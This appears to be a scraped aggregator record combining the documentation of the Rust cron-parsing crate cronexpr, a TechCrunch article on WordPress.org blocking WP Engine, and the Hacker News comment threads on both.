\"2024-10-13T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter1), \"2024-10-19T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter1), \"2024-10-27T12:00:00+00:00[UTC]\"); let crontab2 = cronexpr::parse_crontab(\"0 12 1-31/2 * 0,6 UTC\").unwrap(); let mut iter2 = crontab2.iter_after(\"2024-09-24T13:06:52Z\").unwrap(); assert_eq!(next(&mut iter2), \"2024-09-25T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter2), \"2024-09-27T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter2), \"2024-09-28T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter2), \"2024-09-29T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter2), \"2024-10-01T12:00:00+00:00[UTC]\"); §Nearest weekday at the edge of the month Nearest weekday does not ‘jump’ over the boundary of a month’s days. Thus, if 1W is specified as the value for day-of-month, and the 1st is a Saturday, the trigger fires on Monday the 3rd. (Although the nearest weekday to the 1st is the last day of the previous month.) If 31W is specified as the value for day-of-month, and the 31st is a Sunday, the trigger fires on Friday the 29th. (Although the nearest weekday to the 31st is the 1st of the next month.) This is the same for 30W, 29W, 28W, etc. if the day is the last day of the month. If 31W is specified as the value for day-of-month, the month does not have 31 days, the trigger won’t fire in the month. This is the same for 30W, 29W, etc. §Nth day of week does not exist If the Nth day of week does not exist in the month, the trigger won’t fire in the month. This happens only when the month has less than five of the weekday. §FAQ §Why do you create this crate? The other way when I was implementing features like CREATE TASK in Snowflake, it comes to a requirement to support parsing and driving a crontab expression. Typically, the language interface looks like: CREATE TASK do_retention SCHEDULE = '* * * * * Asia/Shanghai' AS DELETE FROM t WHERE now() - ts > 'PT10s'::interval; The execution part of a traditional cron is the statement (DELETE FROM ...) here. Thus, what I need is a library to parse the crontab expression and find the next timestamp to execute the statement, without the need to execute the statement in the crontab library itself. There are several good candidates like croner and saffron, but they are not suitable for my use case. Both of them do not support defining timezone in the expression which is essential to my use case. Although croner support specific timezone later when matching, the user experience is quite different. Also, the syntax that croner or saffron supports is subtly different from my demand. Other libraries are unmaintained or immature to use. Last, most candidates using chrono to processing datetime, while I’d prefer to extend the jiff ecosystem. §Why does the crate require the timezone to be specified in the crontab expression? Mainly two reasons: Without timezone information, you can not perform daylight saving time (DST) arithmetic, and the result of the next timestamp may be incorrect. When define the crontab expression, people usually have a specific timezone in mind. It’s more natural to specify the timezone in the expression, instead of having UTC as an implicit and forcing the user to convert the datetime to UTC. If there is a third reason, that is, it’s how Snowflake does. §Why does Crontab::find_next and Crontab::iter_after only support exclusive bounds? Crontab jobs are schedule at most every minute. Bike-shedding the inclusive bounds is not practical. If you’d like to try to match the boundary anyway, you can test it with Crontab::matches before calling Crontab::find_next or Crontab::iter_after. §Why not support aliases like @hourly and @reboot? They are too handy to support and are totally different syntax in parsing. @reboot is meaningless since this crate only parse and drive a crontab expression, rather than execute the command. Other aliases should be easily converted to the syntax this crate supports. §Why not support seconds and/or years? Crontab jobs are typically not frequent tasks that run in seconds. Especially for scheduling tasks in a distributed database, trying to specify a task in seconds is impractical. I don’t actually schedule the task exactly at the timestamp, but record the previous timestamp, and then schedule the task when now is greater than or equal to the next timestamp. For years, it’s not a common use case for crontab jobs. This crate can already specify “every year”. fn next(iter: &mut cronexpr::CronTimesIter) -> String { iter.next().unwrap().unwrap().to_string() } // every year at 00:00:00 on January 1st let crontab = cronexpr::parse_crontab(\"0 0 1 JAN * UTC\").unwrap(); let mut iter = crontab.iter_after(\"2024-09-24T13:06:52Z\").unwrap(); assert_eq!(next(&mut iter), \"2025-01-01T00:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter), \"2026-01-01T00:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter), \"2027-01-01T00:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter), \"2028-01-01T00:00:00+00:00[UTC]\"); If you need to match certain years, please do it externally. §Why not support passing command to execute? The original purpose of this crate to provide a library to parse and drive the crontab expression to find the next timestamp, while the execution part is scheduled outside. Note that a crontab library scheduling command can be built upon this crate. §Why not support ?, % and many other non-standard extensions? For ?, it’s a workaround to * and the famous cron bug. This crate implements the Vixie’s cron behavior, so ? is not necessary. For %, it’s coupled with command execution. This crate doesn’t support executing so % is meaningless. For # indicates comments, this crate doesn’t support comments. It’s too random for a library. Structs§ CronTimesIter An iterator over the times matching the contained cron value. Created with Crontab::iter_after. Crontab A data struct representing the crontab expression. Error An error that can occur in this crate. MakeTimestamp A helper struct to construct a Timestamp. This is useful to avoid version lock-in to jiff. Functions§ normalize_crontab Normalize a crontab expression to compact form. parse_crontab Parse a crontab expression to Crontab. See the top-level documentation for the full syntax definitions.",
    "commentLink": "https://news.ycombinator.com/item?id=41654723",
    "commentBody": "Cronexpr, a Rust library to parse and iter crontab expression (docs.rs)130 points by tison 13 hours agohidepastfavorite22 comments cuu508 12 hours agoLooks well done. I like how the docs describe every syntax feature, and every non-standard feature in detail. Hat tip to implementing Vixie's \"*,10\" quirk, and to handling DST. reply tison 10 hours agoparentYou're welcome! As described in the \"Why do you create this crate?\" section, I actually started this domain only a few weeks ago. So I experienced how those tribal rules can be confusing and hard to search over the Internet the understand their semantic. And when I sorted out the parse structure [1] and finished the extensions [2][3], I believe I should write it down for others (and future me) :D [1] https://github.com/tisonkun/cronexpr/pull/4 [2] https://github.com/tisonkun/cronexpr/pull/5 [3] https://github.com/tisonkun/cronexpr/pull/6 reply vlovich123 6 hours agorootparentIs there a comparison to other cron parsing libraries like Saffron? https://github.com/cloudflare/saffron reply the_duke 6 hours agoprevThere is also a cron parser library from Cloudflare which is used for their cron jobs: https://github.com/cloudflare/saffron reply epage 7 hours agoprevAfter working with Jenkins which has \"hashed value\" support for automatic staggering of jobs, I think its essential in any cron syntax evaluater. reply tison 7 hours agoparentThis can be optionally supported. To be clear, does it mean almost \"RANDOM at construction\" and the parser will assign a value by a hash/random function and then the crontab struct has an immutable value of that field? reply epage 4 hours agorootparentThe way jenkins did it is they took the job name and hashed that. This gives you good staggering while still being consistent from run to run (compared to using a random number). This does mean it is immutable, not just at construction but ideally across separate constructions so long as the seed is the same. For an API, I could see either taking in something that is hashable or just taking in a number and letting the caller choose their hashing. From the person's perspective writing cron syntax, they shouldn't care so long as they get the intended affect. reply 1oooqooq 3 hours agoprevisn't cron removed from most distros? now you need 3 or 4 different files for systemd-cronie reply proaralyst 2 hours agoparentSystemd timer units are usually two: one for the service you want to run, one for the timer file. I think you're confusing systemd timer units with Cronie[0], a crond implementation that I think predates systemd? It's possible there's some systemd thing I don't know about though! I think most distros at least have an installable crond [0]: https://github.com/cronie-crond/cronie/ reply Black616Angel 11 hours agoprevMain drawback is the need for timestamps. Most crontab files or expressions I've seen didn't have them. reply tison 10 hours agoparentIf you mean timezone, I wrote an FAQ [1]: \"Why does the crate require the timezone to be specified in the crontab expression?\" [1] https://docs.rs/cronexpr/latest/cronexpr/#why-does-the-crate... reply qwertox 8 hours agorootparentIs `timezone` optional? I like it that it has the ability for one to provide it, but not providing it could just use the one the system has been configured to use. reply tison 8 hours agorootparentYeah. Actually, this is possible to extend the interface with options to accept 1. Optional Timezone. 2. Second-level precision (perhaps feature flags are more suitable here) It just falls out my first requirements so I don't support it. Being too generic is a common source of failure in my experience. As a library developer I have my opinion on how things should be done and provide the default fits that mind :D reply aaomidi 10 hours agorootparentprevSo many of these restrictions feels arbitrary. Not supporting comments? Why? Assuming UTC for tz is not weird and cron users expect it, I guess why even support this specific syntax if the crons need to be edited to fit how this code expects them? There may have been better options if you were going full green field. Good work though! reply burntsushi 19 minutes agorootparent> Assuming UTC for tz is not weird and cron users expect it, That would definitely be weird and unexpected. My crons are interpreted with respect to my system's configured time zone, which seems way more expected than just using UTC. Taking a datetime and just assuming it's UTC is often a mistake. It's why the TC39 Temporal proposal (overhauling datetimes for Javascript) won't let you silently do it. reply tison 10 hours agoparentprevCould you elaborate a bit on the issue? I'm not sure you are commenting on cronexpr or other libraries. In cronexpr, there is no requirement for a timestamp until you'd like to find the next scheduled time, and thus you need to provide a related point. To decouple with certain datetime lib, I made a `MakeTimestamp` struct which provides multiple constructors. Later, I found it somehow like a function overload :D reply tricked 10 hours agoparentprevDo you mean timezones? if so it shouldn't be that hard to detect if there's no timezone and add it with your own code. reply assiniboine 10 hours agoparentprevIt doesn't need timestamps. It parses crontab to/from timestamps where needed. reply qwertox 8 hours agoprevIf you're into Python, APScheduler is the way to go. It also has a cron scheduler [0] which includes scheduling down to seconds and perfectly integrates with asyncio [1]. async def myfunc(): print(f\"{Fore.GREEN}Readout triggered at { datetime.now().strftime('%H:%M:%S') }{COLORS_RESET}\") await disk_temperatures_handler.readout(storage) scheduler = AsyncIOScheduler() storage['scheduler'] = scheduler scheduler.add_job(myfunc, CronTrigger(second='*/15'), id='readout_job') scheduler.start() You can also modify the interval on-the-fly. [0] https://apscheduler.readthedocs.io/en/3.x/modules/triggers/c... [1] https://apscheduler.readthedocs.io/en/3.x/modules/executors/... reply faangguyindia 9 hours agoprev [–] I've LLM based crontab bot. Where I simply write stuff like \"run my backupBitBuckettoDropbox.sh from home directory at 3am everyday\". I never really liked cronjob expressions. reply Jleagle 8 hours agoparent [–] This sounds great, if i could trust it to get it right 100% of the time. reply simonw 8 hours agorootparent [–] With the right harness around it you could trust it. Set it up so that it takes your input, generates the cron expression, then uses a deterministic cron library to spit out a summary of what that expression does plus a list of next upcoming instances. That should give you all the information you need to determine if it got the right expression. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "`cronexpr` is a Rust library designed for parsing and driving crontab expressions, supporting both standard and non-standard syntax extensions.",
      "The library mandates timezone specification and supports IANA Time Zone Database names, ensuring accurate handling of time zones and DST (Daylight Saving Time).",
      "Key features include handling edge cases like Vixie’s cron bug, and providing iterators for matching times, but it does not execute commands or support aliases like @hourly or @reboot."
    ],
    "commentSummary": [
      "Cronexpr is a Rust library designed for parsing and iterating crontab expressions, with detailed documentation and support for non-standard features.",
      "The project, initiated by tison, aims to simplify the understanding of complex cron rules and has been compared to other libraries like Cloudflare's Saffron.",
      "Discussions among users highlighted the importance of features such as \"hashed value\" support for job staggering, timestamps, and timezones, with alternatives like APScheduler for Python also being mentioned."
    ],
    "points": 130,
    "commentCount": 22,
    "retryCount": 0,
    "time": 1727327446
  },
  {
    "id": 41655967,
    "title": "Wordpress.org bans WP Engine, blocks it from accessing its resources",
    "originLink": "https://techcrunch.com/2024/09/25/wordpress-org-bans-wp-engine-blocks-it-from-accessing-its-resources/",
    "originBody": "Login Search Search Startups Venture Apple Security AI Apps Events Startup Battlefield More Close Submenu Fintech Cloud Computing Layoffs Hardware Google Microsoft Transportation EVs Meta Instagram Amazon TikTok Newsletters Podcasts Partner Content Crunchboard Jobs Contact Us Social WordPress.org bans WP Engine, blocks it from accessing its resources Ivan Mehta 10:46 PM PDT • September 25, 2024 Comment Image Credits: Brian Ach / Getty Images WordPress drama went up another notch on Wednesday after WordPress.org, the open source web-hosting software, banned hosting provider WP Engine from accessing its resources. In a post on WordPress.org, WordPress co-creator and Automattic CEO Matt Mullenweg wrote that pending their legal claims, WP Engine will not have access to the platform’s resources, such as themes and plug-ins. “WP Engine wants to control your WordPress experience, they need to run their own user login system, update servers, plugin directory, theme directory, pattern directory, block directory, translations, photo directory, job board, meetups, conferences, bug tracker, forums, Slack, Ping-o-matic, and showcase. Their servers can no longer access our servers for free,” he said. “WP Engine is free to offer their hacked up, bastardized simulacra of WordPress’s GPL code to their customers, and they can experience WordPress as WP Engine envisions it, with them getting all of the profits and providing all of the services,” Mullenweg wrote. As a result of this block, sites using WP Engine’s solutions cannot install plug-ins or update their themes. Today in Matt destroys the WordPress community: you can't add plugins directly from the .org repo if you have a WP Engine site. And I can confirm that this is happening.https://t.co/vRd7jliVsM pic.twitter.com/9XGAtXhUoN — Jacob Martella (@ViewFromTheBox) September 25, 2024 I want to share: https://t.co/CmCwbcxZfD has blocked @wpengine customers from updating and installing plugins and themes via WP Admin—disrupting essential work for #WordPress users, agencies, freelancers, and plugin developers. Please read: https://t.co/cE45rmvnqW — Brian Gardner (@bgardner) September 25, 2024 Not being able to do @WordPress updates because of the @photomatt/@wpengine fight is infuriating. For a small nonprofit, being caught in the middle of this could be costly if we need to migrate our sites to a new host. That money/time should be used for our mission. — Michael Geheren (@mgeheren) September 25, 2024 As several WordPress developers and advocates pointed out, the ban also prevents WP Engine customers from accessing security updates, leaving them vulnerable. WP Engine acknowledged this issue and said the company is working on a fix. “WordPress.org has blocked WP Engine customers from updating and installing plugins and themes via WP Admin. There is currently no impact on the performance, reliability, or security of your site, nor does it impact your ability to make updates to your code or content,” an update from WP Engine read. In response to the incident, WP Engine said in a post that Mullenweg had misused his control of WordPress to interfere with WP Engine customers’ access to WordPress.org. “Matt Mullenweg’s unprecedented and unwarranted action interferes with the normal operation of the entire WordPress ecosystem, impacting not just WP Engine and our customers, but all WordPress plugin developers and open-source users who depend on WP Engine tools like ACF,” WP Engine said. Matt Mullenweg, CEO of Automattic, has misused his control of WordPress to interfere with WP Engine customers’ access to https://t.co/ZpKb9q4jPh, asserting that he did so because WP Engine filed litigation against https://t.co/erlNmkIol2. This simply is not true. Our Cease &… — WP Engine (@wpengine) September 26, 2024 The WP Engine vs. Automattic fight It’s important to understand that WordPress powers nearly 40% of the websites on the internet through different hosting providers, which include Mullenweg’s Automattic and WP Engine. Users can also take the open source project and run the websites themselves, but a lot of people choose to go with plug-and-play solutions. The fight began last week when Mullenweg criticized WP Engine publicly at a conference and on his blog for profiteering and called it a “cancer to WordPress.” He also alleged the company doesn’t contribute as much as Automattic does to the WordPress community despite both of them making about a half-billion dollars in revenue annually. This spurred WP Engine to send a cease-and-desist letter to Mullenweg and Automattic, asking them to withdraw their comments. The letter alleged that Mullenweg and Automattic had threatened to adopt a “scorched earth nuclear approach” if WP Engine did not comply and pay Automattic a percentage of its gross revenue. In reply, Automattic sent its own cease-and-desist letter to WP Engine, alleging infringement of the WordPress and WooCommerce trademarks. Separately, the WordPress Foundation, a charity created by Mullenweg to maintain WordPress as an open source project, told TechCrunch that WP Engine has violated its trademarks. “WP Engine has indeed breached the WordPress Trademark Policy. The Policy states that no one is allowed to use the WordPress trademarks as part of a product, project, service, domain name, or company name. WP Engine has repeatedly violated this policy and the Cease and Desist letter sent to them by Automattic provides examples of some of the many violations,” the foundation said in an email. The policy was updated yesterday to include an example of WP Engine. Notably, the policy doesn’t cover “WP” as a trademark. Hours after banning WP Engine from WordPress.org, Mullenweg wrote on his blog that trademarks are the core issue. He said Automattic has been trying to sign a licensing deal with WP Engine for a long time. He noted that the company offered WP Engine the option to either pay a direct licensing fee or make in-kind contributions to the open source project. However, he didn’t clarify what making in-kind contributions would mean. You can contact this reporter at im@ivanmehta.com or on Signal: @ivan.42 More TechCrunch Get the industry’s biggest tech news Explore all newsletters TechCrunch Daily News Every weekday and Sunday, you can get the best of TechCrunch’s coverage. Add TechCrunch Daily News to your subscription choices Startups Weekly Startups are the core of TechCrunch, so get our best coverage delivered weekly. Add Startups Weekly to your subscription choices TechCrunch Fintech The latest Fintech news and analysis, delivered every Tuesday. Add TechCrunch Fintech to your subscription choices TechCrunch Mobility TechCrunch Mobility is your destination for transportation news and insight. Add TechCrunch Mobility to your subscription choices No newsletters selected No newsletters Email address (required) Subscribe By submitting your email, you agree to our Terms and Privacy Notice. Tags matt mullenweg, Social, WordPress, Wordpress.org, wp engine Climate Zap Energy investors in recent $130M round included Soros Fund and Laurene Powell Jobs’ Emerson Collective Tim De Chant 30 mins ago The company recently closed a $130 million round, according to an SEC filing, bringing the total to $327 million. Transportation Uber snags another robotaxi deal, aviation startups land VC bucks, and where Rivian Foundation money is going Kirsten Korosec 50 mins ago Welcome back to TechCrunch Mobility — your central hub for news and insights on the future of transportation. Sign up here for free — just click TechCrunch Mobility! I’ve been… Security Kaspersky defends force-replacing its security software without users’ explicit consent Lorenzo Franceschi-Bicchierai 2 hours ago That lack of user interaction — or request for consent — is what confused and concerned some former Kaspersky customers. Social The WordPress vs. WP Engine drama, explained Ivan Mehta 2 hours ago The world of WordPress, one of the most popular technologies for creating and hosting websites, is going through a very heated controversy. The core issue is the fight between WordPress… Featured Article Tesla Superchargers: GM, Ford, Rivian, and other EV brands with access EV owners of GM vehicles like the Chevrolet Silverado EV and Cadillac Lyriq will now officially have access to Tesla’s Superchargers. Rebecca Bellan 3 hours ago Transportation BMW says we need both battery and hydrogen EVs for a zero-emissions future Rebecca Bellan 3 hours ago Despite hydrogen’s challenges, BMW thinks the only way to actually achieve a shift to zero-emissions transportation is through a mix of BEVs and hydrogen vehicles. AI Google’s NotebookLM enhances AI note-taking with YouTube, audio file sources, sharable audio discussions Jagmeet Singh 3 hours ago Google’s NotebookLM has been updated with YouTube and audio files as new source types and sharable links for Audio Overviews. Startups EVA, an entertainment booking platform for events, raises $2M as it expands to more cities Lauren Forristal 3 hours ago EVA, the platform that connects event bookers with local performers, has secured $2 million in funding as the popularity of in-person events comes back in full force. The round, which… Apps Subscription management platform RevenueCat acquires a ‘spicy’ audiobooks app (??!!) Sarah Perez 3 hours ago The idea here is to bring a subscription-based app in-house to serve as a testing ground for RevenueCat’s new features. TechCrunch Disrupt 2024 Announcing the final agenda for the AI Stage at TechCrunch Disrupt 2024 Devin Coldewey Richard Smith Kyle Wiggers 4 hours ago We’re thrilled to announce that the agenda for our dedicated AI Stage presented by Google Cloud to TechCrunch Disrupt 2024 is complete and ready to go! It joins fintech, SaaS,… Social Meta Connect 2024: Orion glasses, Quest 3S headset, Meta AI upgrades, Ray-Ban Meta real-time video, and more Cody Corrall Morgan Little 4 hours ago Meta Connect 2024 is a developer-centric event featuring a keynote from CEO Mark Zuckerberg. He showcased new hardware and software to support two of Meta’s big ambitions: AI and the… Security India’s Star Health says it’s investigating after hacker posts stolen medical data Jagmeet Singh 4 hours ago The health insurance giant is investigating an incident that allegedly leaked sensitive customer medical data. TechCrunch Disrupt 2024 2 days left to save up to $600 on TechCrunch Disrupt 2024 tickets TechCrunch Events 4 hours ago We’re in the final stretch of Ticket Reboot Week with just 48 hours remaining! You can still save up to $600 on individual ticket types to TechCrunch Disrupt 2024. Don’t… Apps After is a new dating app that tries to tackle ghosting Aisha Malik 6 hours ago A new female-founded dating app called After is launching in Austin, Texas, on Thursday with the mission of tackling ghosting and holding people accountable. What sets the app apart from… Privacy The Tor Project merges with Tails, a Linux-based portable OS focused on privacy Paul Sawers 7 hours ago The Tor Project is merging operations with Tails, a portable Linux-based operating system focused on preserving user privacy and anonymity. AI Prepared, which wants to ‘revolutionize’ emergency 911 calls, raises $27M Kyle Wiggers 7 hours ago A company that claims its tech can “revolutionize” emergency calls has raised $27 million in a Series B round led by Andreessen Horowitz. The company, Prepared, enables 911 dispatchers to… Startups As war rages in Ukraine, investment in European defense and dual-use tech skyrockets Mike Butcher 8 hours ago A new Dealroom report shows that VC investment in defense-related tech is outpacing any other type of investment across NATO member states and allies. Venture Peak XV has reaped $1.2B in the year since it split from Sequoia Manish Singh 12 hours ago Peak XV Partners, the largest India-focused venture fund, has realized about $1.2 billion in exits since it separated from Sequoia last year. Social WordPress.org bans WP Engine, blocks it from accessing its resources Ivan Mehta 13 hours ago WordPress drama went up another notch on Wednesday after WordPress.org banned hosting provider WP Engine from accessing its resources. Image Credits: Brian Ach / Getty Images Climate Marvel Fusion lands $70M for laser-powered fusion bet Tim De Chant 14 hours ago Marvel Fusion is one of several companies pursuing what’s known as inertial confinement fusion. AI OpenAI’s chief research officer has left following CTO Mira Murati’s exit Kyle Wiggers 19 hours ago OpenAI’s chief research officer, Bob McGrew, and a research VP, Barret Zoph, left the company on Wednesday, hours after OpenAI CTO Mira Murati announced she would be departing. CEO Sam… Startups Dinii, a cloud-based restaurant management platform, raises $45M Series B Kate Park 19 hours ago Japan has always been a strong market for bringing technology into the experience of consuming food, and now one of the startups leading on this idea is attracting investors from… Venture Pear wants to empower up-and-coming VCs with its new emerging managers in residence program Marina Temkin 19 hours ago When seed-focused Pear VC raised a $432 million fund last year, the firm co-founder Pejman Nozad said that it meant his firm had reached its “own product-market-fit.” That fourth fund… Fundraising 13 companies from YC Demo Day 1 that are worth paying attention to Rebecca Szkutak 21 hours ago Unsurprisingly, AI companies dominated the day, with startups looking to apply the technology to problems like estate planning and automating clinical trial data. AI Sam Altman reportedly poised to get equity in OpenAI for the first time Kyle Wiggers 22 hours ago Following the abrupt departure of OpenAI’s CTO, Mira Murati, CEO Sam Altman is reportedly poised to receive equity in the company for the first time as OpenAI moves away from… AI Zuckerberg chats with AI clone as human creator looks on in year’s weirdest demo Brian Heater 23 hours ago The demo showcased AI Studio, a platform for designing custom chatbots. Social What does Mark Zuckerberg’s shirt say? Amanda Silberling 23 hours ago Three years ago, Mark Zuckerberg’s big day was a flop. At his company’s annual developer conference — then called Facebook Connect — he unveiled his grand plans to turn his… Apps Meta pitches VR to mobile developers with new support for Android apps on Quest Sarah Perez 23 hours ago Meta says it’s working to make it easier for mobile developers to make the shift to Meta’s Horizon OS. AI OpenAI CTO Mira Murati says she’s leaving the company Maxwell Zeff Kyle Wiggers 24 hours ago The decision comes just a few weeks before OpenAI’s Dev Day, its annual developer conference. Hardware Meta announces $300 Quest 3S, a cheaper take on mixed reality Brian Heater 1 day ago The Meta Quest 3S is up for preorder Wednesday. It starts shipping October 15. About TechCrunch Staff Contact Us Advertise Crunchboard Jobs Site Map Legal Terms of Service Privacy Policy RSS Terms of Use Privacy Placeholder 1 Privacy Placeholder 2 Privacy Placeholder 3 Privacy Placeholder 4 Code of Conduct About Our Ads Trending Tech Topics Meta Connect 2024 CloudKitchens Lawsuit OpenAI CTO Mira Murati Orion Glasses iOS 18 Tech Layoffs ChatGPT Facebook X YouTube Instagram LinkedIn Mastodon Threads © 2024 Yahoo. All rights reserved. Powered by WordPress VIP",
    "commentLink": "https://news.ycombinator.com/item?id=41655967",
    "commentBody": "Wordpress.org bans WP Engine, blocks it from accessing its resources (techcrunch.com)96 points by openplatypus 10 hours agohidepastfavorite152 comments philsquared_ 1 hour agoThe problem I have with this is simple and has to do with the lack of separation of entities. Automattic is a competitor with WPEngine. Wordpress.com is a competitor with WPEngine. Wordpress.org and the Wordpress Foundation IS NOT a competitor with WPEngine. There is a dispute between Automattic and WPEngine. The resources of Wordpress.org and the Wordpress Foundation should not be leverage in this dispute. The fact that those boundaries are crossed means that anyone who is in competition with Automattic might have any and all ecosystems that Matt has any control over leveraged against them if they upset Matt or Automattic in any way. It is very poor taste and changes the perspective of the product. Instead of a professional entity who will engage professionally it is now a form of leverage that a single person could wield against anyone who crosses them. To be clear these same exact actions can be taken against anyone who insults one individual. This look is embarrassing. reply jeswin 9 hours agoprevIf like Matt says, they contribute little back to Wordpress then I am with Automattic on this. If you're a tiny org, you don't need to contribute back. But if you're making half a billion in revenue every year on top of someone else's tech, you need to stay involved and contribute back in a very significant way. Now one could say that the license allows that and it's legal. Sure, but so is cutting their free access off. If WPEngine is just leeching and spending nothing on improving the product, there's no way anyone can compete with them on price. Open Source is expensive, people need to be paid. Bottom line: Size matters. Meta's company-size based licensing (as seen in Llama) is a step in the right direction. FOSS projects should adopt it more widely where it matters. reply yreg 8 hours agoparentIf you have such expectations then clearly state the rules. - individuals and companies under $a yearly revenue can use the product for free - companies under $b have to pay $x - companies under $c have to pay $y Pretending that something is free to use and then getting disappointed when someone rich indeed uses that thing for free and fighting with them doesn't help anyone at all. (This is not specific to Wordpress.) reply lnxg33k1 7 hours agorootparentI feel like there could be little need for rules if people had a little common sense, then if you have targets, other start doing the bare minimum, I'd rather have parasites like WPEngine put off reply EasyMark 54 minutes agorootparentI agree, if I would making bookoo bucks off of someone else’s “open”platform, you could be 100% sure I would be feeding the golden goose some grain to build some rapport. If I’m playing with it in my homelab, maybe not so much but try occasionally to donate if it’s an OSS project that $10-50 makes a difference for. reply Sebb767 7 hours agoparentprev> Meta's company-size based licensing (as seen in Llama) is a step in the right direction. We have been bitten by that hard in the past. As a small company (a few students, hardly 5 figure revenue) we've sold our product to a known household-brand to use as a gadget for an exhibition. In said product, we used a library that used revenue-based licensing. For some reason, the company behind that library heard of us having scored that customer and suddenly demanded insane amount of licensing fees. Luckily, the purchasing department of the customer offered to handle this and negotiate a deal; otherwise, this could have immediately sunk our company. reply mrkramer 7 hours agoparentprev>If you're a tiny org, you don't need to contribute back. But if you're making half a billion in revenue every year on top of someone else's tech, you need to stay involved and contribute back in a very significant way. For example Sony sold more than 100 million units of PS4 and made billions of dollars from it and how much they contributed to the open source projects they've used in PS4? Take a look at OSS projects used in PS4: https://www.playstation.com/en-us/oss/ps4/ Did they contribute anything? Did they contribute 100% enough or just 20% or 30%? If the software is open sourced and if license allows you to do anything with it then you are indeed free to do anything with it including selling products which include OSS. reply hobofan 4 hours agorootparent1. This is pure whataboutism. Just because Sony doesn't contribute (I don't know whether they do or don't), doesn't make it right. 2. There is obviously a difference between \"selling products that include OSS\" and \"selling OSS 1:1\". It's not like Sony's firmware/dashboard is maintained by \"OpenGamingConsoleDashboard\" and they are selling a 95% repackage of that to their end users (also ignoring the hardware). This pertains to the software maintenance logistics layer and not the licensing layer. Sure, both in the Sony and WPEngine cases they are in the clear on the licensing, but that doesn't make for sustainable development of the underlying software. I'd also wager that if the OSS projects used in the PS4 would drum up enough of a social media stink, they'd have decent chances of getting some compensation (e.g. the TLDraw maintainers did that quite a few times successfully). reply KomoD 3 hours agorootparentThey're not \"selling OSS 1:1\", they're selling managed hosting. reply asmor 9 hours agoparentprevThis is a horrible way to go about it though. WP Engine users are still WordPress users, and cutting them off without notice is very shitty. I wouldn't trust WordPress for anything after this, if all that it takes to cut you off from updates - potentially security updates - is Matt Mullenweg not liking you (or your ISP). reply bachmeier 8 hours agorootparentIf you're running a large business and you don't have a plan in case a free resource provided by someone else goes away, you shouldn't be in business. It really is that simple. reply EasyMark 50 minutes agorootparent“The market is merciless” is something a business should always keep in mind, at least when their existence isn’t guaranteed for some reason. reply cies 8 hours agorootparentprevThey could move their sites over to the WordPress.com, can't they? Since they offer competing services in the first place. reply mikeyinternews 6 hours agorootparentWPE isn't cheap and subscriptions are typically yearly contracts, so it's not that simple for those operating on a specific budget reply dncornholio 8 hours agorootparentprevWordPress.com is actually doing the exact shady things that WP Engine does. Confusing WordPress.org users that they need a paid account to run WordPress. reply cies 5 hours agorootparentYou need to pay for hosting right? Nothing new. Sure WP also has some freemium model, but I do not consider that shady. Have you seen the Automattic CEO talk (link to YT in other comment in this thread). I dont think he's in shady business: he's releasing loads of source code under the GPL! reply asmor 8 hours agorootparentprevWPCOM is a very limited WordPress - much more limited than Mullenweg is accusing WP Engine of being. The real competitor in Automattics portfolio is Pressable. Who are currently running a poaching campaign on their frontpage. reply batuhanicoz 8 hours agorootparentWordPress.com started out as a WordPressµ (WordPress Multi User) provider. Just a place for people to quickly start their own blogs, mainly hosted on a WordPress.com subdomain. To learn more about WordPress MU: https://codex.wordpress.org/WordPress_MU \"WordPress hosting\" is a relatively new option on WordPress.com. Pressable is a more advanced WordPress hosting provider, built by Automattic. Disclaimer: I work at Automattic. reply prox 5 hours agorootparentObviously you don’t have to answer, but it feels like with Pressable as a product, WPE suddenly became a big competitor to the bottom line. It is here where the optics suddenly become shady. Like WPE has been running like they do for years, and now suddenly it is a big problem? Like why now? Personally I also don’t like that the .org suddenly becomes weaponized. If this can be done to WPE, it can be done to anyone else really. reply RealStickman_ 8 hours agorootparentprevIs that supposed to make this blatantly anti-competitive behaviour okay? reply cies 5 hours agorootparentSorry? Their service is... their service! They can extend of refuse service to whom they want. Automattic is releasing source code, which, in my book, is being super friendly to competitors. It seems to me you are holding the good guys (that release under FLOSS licenses) to a higher standard than any other company that keeps the source to them selves. reply dncornholio 9 hours agoparentprevWhere does it state that if you profit x amount of profit you should contribute back? What is the maximum amount of profit you can make? reply EasyMark 49 minutes agorootparentIt’s in your own self interest to know what you’ve built your business on and have a backup plan if the bottom falls out. I don’t really have any compassion for them, but I do for their users. reply jeswin 8 hours agorootparentprev> Where does it state that if you profit x amount of profit you should contribute back? It doesn't. But it doesn't say anywhere that you should get resources (like storage and compute) for free either. > What is the maximum amount of profit you can make? I don't know. But I can argue that someone bringing in 500 million a year in revenue should be acting differently from someone bringing in 500k a year. If they contribute back little or nothing, no other player (such as Automattic) who contributes back will be able to compete with them. reply prox 8 hours agorootparentprevApparently that’s Matts problem, he says Automattic is giving a lot more back (4000 hours or so) and WPE is doing like 40 hours. So yeah, is WPE in the right to not give back? At the heart of this is the same song of making money and the idea of fairness. I honestly don’t know the groundrules here. reply fragmede 7 hours agorootparentethically or legally? because they both matter, but they are decided in the court of public opinion and of law, respectively, but only one carries actual fiscal weight. reply prox 5 hours agorootparentPersonally, and I need to read more, is that ethically the problem lies with sharing. Is Matt/automattic ethically obliged due compensation? I think not. WP Engine is its own company like automattic. Would it grace WPE if they do compensate with money or resources? Obviously, but then you might also want to put them in the foundation oversee committee if they do half of the work. The law, I have no idea in what direction this is going to go! reply cies 8 hours agorootparentprevDo they have to state it? I think you simply get a phone call to pony up some cash when Automattic has you on their radar. reply martin_a 8 hours agoparentprev> If you're a tiny org, you don't need to contribute back. But if you're making [...] contribute back in a very significant way. I'd like to see the price list on this beforehand, so I can decide whether I want to be a tiny org or a big one. Where's that pricelist? reply Communitivity 6 hours agoprevMy empathy is with Automatic on this one, but I still think it's the wrong move. \"Now one could say that the license allows that and it's legal. Sure, but so is cutting their free access off. If WPEngine is just leeching and spending nothing on improving the product, there's no way anyone can compete with them on price. Open Source is expensive, people need to be paid.\"-jeswin If companies can't use Open Source without the risk that the project could ban them from using it, even if the company adheres to the letter of the license (if not the spirit), then most companies won't use Open Source. 